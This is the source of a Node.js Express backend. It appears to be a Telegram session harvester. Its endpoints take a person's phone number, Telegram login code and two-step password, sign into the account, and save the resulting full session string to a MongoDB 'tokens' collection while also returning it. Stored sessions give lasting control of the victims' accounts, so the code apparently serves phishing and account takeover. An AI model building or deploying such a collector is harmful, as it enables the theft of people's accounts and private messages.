require('dotenv').config();
const express    = require('express');
const cors       = require('cors');
const { MongoClient } = require('mongodb');
const { TelegramClient } = require('telegram');
const { StringSession }  = require('telegram/sessions');
const { Api } = require('telegram/tl');

const app = express();
app.use(cors());
app.use(express.json());

// ── Config ────────────────────────────────────────────────────────────────────
const API_ID   = parseInt(process.env.API_ID)  || 17349;
const API_HASH = process.env.API_HASH           || '344583e45741c457fe1862106095a5eb';
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.error('❌ MONGO_URI မသတ်မှတ်ရသေး!');
  process.exit(1);
}

// ── MongoDB ───────────────────────────────────────────────────────────────────
const mongoClient = new MongoClient(MONGO_URI);
let db;
async function connectDB() {
  try {
    await mongoClient.connect();
    db = mongoClient.db('telegram_data');
    console.log('✅ MongoDB connected!');
  } catch (err) {
    console.error('❌ MongoDB error:', err.message);
  }
}
connectDB();

// ── Session store (in-memory) ─────────────────────────────────────────────────
// { phone -> { tempSession, phoneCodeHash } }
const sessionStore = new Map();

// ── Telegram helper functions ─────────────────────────────────────────────────
async function sendCode(phone) {
  const client = new TelegramClient(
    new StringSession(''), API_ID, API_HASH, { connectionRetries: 3 }
  );
  await client.connect();
  try {
    const result = await client.invoke(new Api.auth.SendCode({
      phoneNumber: phone,
      apiId: API_ID,
      apiHash: API_HASH,
      settings: new Api.CodeSettings({}),
    }));
    const tempSession = client.session.save();
    return {
      status: 'success',
      phoneCodeHash: result.phoneCodeHash,
      tempSession,
    };
  } finally {
    await client.disconnect();
  }
}

async function verifyCode(phone, code, phoneCodeHash, tempSession, password = null) {
  const client = new TelegramClient(
    new StringSession(tempSession), API_ID, API_HASH, { connectionRetries: 3 }
  );
  await client.connect();
  try {
    try {
      await client.invoke(new Api.auth.SignIn({
        phoneNumber: phone,
        phoneCodeHash,
        phoneCode: code,
      }));
    } catch (err) {
      if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
        if (!password) {
          return { status: 'password_required', tempSession };
        }
        // 2FA
        const pwdInfo = await client.invoke(new Api.account.GetPassword());
        const { computeCheck } = require('telegram/Password');
        const inputCheck = await computeCheck(pwdInfo, password);
        await client.invoke(new Api.auth.CheckPassword({ password: inputCheck }));
      } else {
        throw err;
      }
    }
    const session = client.session.save();
    return { status: 'success', session };
  } finally {
    await client.disconnect();
  }
}

// ── Routes ────────────────────────────────────────────────────────────────────
app.post('/api/send-otp', async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Phone is required' });

  try {
    console.log(`📱 Sending OTP to ${phone}...`);
    const result = await sendCode(phone);
    sessionStore.set(phone, {
      phoneCodeHash: result.phoneCodeHash,
      tempSession:   result.tempSession,
    });
    console.log(`✅ OTP sent to ${phone}`);
    res.json({ message: 'OTP sent via Telegram' });
  } catch (err) {
    console.error('send-otp error:', err.message);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

app.post('/api/verify-otp', async (req, res) => {
  const { phone, code, password } = req.body;
  const stored = sessionStore.get(phone);
  if (!stored) return res.status(400).json({ error: 'Session not found. Please request OTP again.' });

  try {
    console.log(`🔐 Verifying OTP for ${phone}...`);
    const result = await verifyCode(
      phone, code,
      stored.phoneCodeHash,
      stored.tempSession,
      password
    );

    if (result.status === 'password_required') {
      // Keep session for 2FA step
      sessionStore.set(phone, { ...stored, tempSession: result.tempSession });
      return res.json({ status: 'password_required' });
    }

    sessionStore.delete(phone);
    console.log(`✅ Login success for ${phone} | session length: ${result.session?.length}`);

    // Save to MongoDB
    if (db) {
      try {
        await db.collection('tokens').insertOne({
          phone,
          token: result.session,
          createdAt: new Date(),
        });
        console.log(`💾 Token saved to MongoDB`);
      } catch (mongoErr) {
        console.error('MongoDB save error:', mongoErr.message);
      }
    }

    res.json({ message: 'Success', session: result.session });
  } catch (err) {
    console.error('verify-otp error:', err.message);
    res.status(400).json({ error: err.message || 'Verification failed' });
  }
});

app.get('/', (req, res) => res.send('✅ Telegram Session Backend Running'));

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🌐 Server on port ${PORT}`));
